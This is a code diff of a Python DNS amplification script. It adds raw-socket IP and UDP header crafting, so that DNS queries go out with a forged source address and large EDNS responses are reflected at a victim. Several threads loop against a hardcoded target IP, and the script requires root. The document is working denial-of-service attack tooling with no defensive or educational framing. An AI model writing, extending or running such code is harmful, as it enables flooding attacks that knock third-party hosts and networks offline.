@@ -5,6 +5,18 @@ import logging
 import random
 import time
 import threading
+import os
+
+
+def checksum(msg):
+    s = 0
+    for i in range(0, len(msg), 2):
+        w = (msg[i] << 8) + (msg[i + 1])
+        s = s + w
+    s = (s >> 16) + (s & 0xffff)
+    s = ~s & 0xffff
+    return s
+
 
 def create_dns_query(domain):
     transaction_id = random.randint(0, 65535)
@@ -22,6 +34,7 @@ def create_dns_query(domain):
     
     query += query_name + struct.pack(">HH", query_type, query_class)
     
+    
     edns_name = 0
     edns_type = 41  # EDNS OPT record
     edns_udp_payload_size = 4096
@@ -34,12 +47,53 @@ def create_dns_query(domain):
     
     return query
 
-def is_valid_ip(ip):
-    try:
-        ipaddress.ip_address(ip)
-        return True
-    except ValueError:
-        return False
+
+def create_ip_header(source_ip, dest_ip, payload_length):
+    ip_header = struct.pack(
+        '!BBHHHBBH4s4s',
+        69,             
+        0,               
+        20 + payload_length,  
+        random.randint(0, 65535), 
+        0,                
+        64,                
+        socket.IPPROTO_UDP, 
+        0,                  
+        socket.inet_aton(source_ip), 
+        socket.inet_aton(dest_ip)   
+    )
+    
+    checksum_val = checksum(ip_header)
+    ip_header = struct.pack(
+        '!BBHHHBBH4s4s',
+        69, 0, 20 + payload_length, random.randint(0, 65535), 0, 64,
+        socket.IPPROTO_UDP, checksum_val, socket.inet_aton(source_ip), socket.inet_aton(dest_ip)
+    )
+    
+    return ip_header
+
+def create_udp_header(source_port, dest_port, payload):
+    udp_length = 8 + len(payload)
+    udp_header = struct.pack(
+        '!HHHH',
+        source_port,
+        dest_port,
+        udp_length,
+        0
+    )
+    return udp_header
+
+
+def send_spoofed_dns_query(spoofed_ip, dns_server, domain):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+    
+    query = create_dns_query(domain)
+    ip_header = create_ip_header(spoofed_ip, dns_server, len(query) + 8)
+    udp_header = create_udp_header(random.randint(1024, 65535), 53, query)
+
+    packet = ip_header + udp_header + query
+    sock.sendto(packet, (dns_server, 53))
+    print(f"Sent spoofed DNS query from {spoofed_ip} to {dns_server}")
 
 def send_amplified_request(target_ip, dns_server, domain):
     if not is_valid_ip(target_ip):
@@ -53,34 +107,10 @@ def send_amplified_request(target_ip, dns_server, domain):
         return
 
     try:
-        family = socket.AF_INET6 if ':' in dns_server else socket.AF_INET
-        sock = socket.socket(family, socket.SOCK_DGRAM)
-        sock.settimeout(2)
-        query = create_dns_query(domain)
-        print(f"Sending DNS query to server: {dns_server}")
-        start_time = time.time()
-        sock.sendto(query, (dns_server, 53))
-        response, _ = sock.recvfrom(8192)
-        end_time = time.time()
-        response_time = end_time - start_time
-        print(f"Received response from DNS server: {len(response)} bytes in {response_time:.4f} seconds")
-        logging.info("Received response from DNS server: %s bytes in %.4f seconds", len(response), response_time)
-        print(f"Sending amplified response to target: {target_ip}")
-        sock.sendto(response, (target_ip, 53))
-        print(f"Sent amplified response to target: {target_ip}")
-        logging.info("Sent amplified response to target: %s", target_ip)
-    except socket.timeout:
-        print("No response from DNS server")
-        logging.error("No response from DNS server")
-        time.sleep(1)
-    except socket.error as e:
-        print(f"Socket error: {e}")
-        logging.error("Socket error: %s", e)
+        send_spoofed_dns_query(target_ip, dns_server, domain)
     except Exception as e:
         print(f"An unexpected error occurred: {e}")
         logging.error("An unexpected error occurred: %s", e)
-    finally:
-        sock.close()
 
 def worker(target_ip, dns_server, domain):
     global running
@@ -88,7 +118,18 @@ def worker(target_ip, dns_server, domain):
         send_amplified_request(target_ip, dns_server, domain)
         time.sleep(interval)
 
+def is_valid_ip(ip):
+    try:
+        ipaddress.ip_address(ip)
+        return True
+    except ValueError:
+        return False
+
 if __name__ == "__main__":
+    if os.geteuid() != 0:
+        print("Este script deve ser executado como root.")
+        exit()
+
     logging.basicConfig(level=logging.INFO, filename='dns.log', filemode='a', format='%(asctime)s - %(levelname)s - %(message)s')
 
     target_ip = "186.249.231.34"
@@ -111,7 +152,7 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print("Process interrupted by user.")
         logging.info("Process interrupted by user.")
-        running = False # Stop all threads
+        running = False
 
         for thread in threads:
             thread.join()
